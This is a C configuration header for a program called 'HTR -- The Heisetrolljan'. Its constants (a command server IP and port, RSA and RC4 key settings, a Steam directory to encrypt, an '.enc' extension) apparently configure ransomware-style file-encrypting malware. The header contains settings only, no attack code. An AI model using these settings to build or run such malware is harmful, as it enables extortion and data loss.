/* 
 * HTR -- The Heisetrolljan
 * 
 * Copyright (C) 2016  Martin Wolters
 *
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation; either version 2
 * of the License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to 
 * the Free Software Foundation, Inc.
 * 51 Franklin Street, Fifth Floor
 * Boston, MA  02110-1301, USA
 * 
 */

#ifndef CONFIG_H_
#define CONFIG_H_
#define CONFIG_SV_ADDR "178.63.96.79"
#define CONFIG_SV_PORT 55555
#define CONFIG_RSA_KSIZE 1024
#define CONFIG_DATADIR "etc/"
#define CONFIG_KEYFILE_EXT ".key"
#define CONFIG_CRYPTDIR "local/share/Steam"
#define CONFIG_CRYPTED_EXT ".enc"
#define CONFIG_PREGEN_KEYS 128
#define CONFIG_REGEN_KEYS 96
#define CONFIG_KEYGEN_SLEEP 60
#define CONFIG_RC4_DROP 4096
#define CONFIG_PREALLOC_FILES 16
#define CONFIG_KEYTAB_SIZE 128
#endif
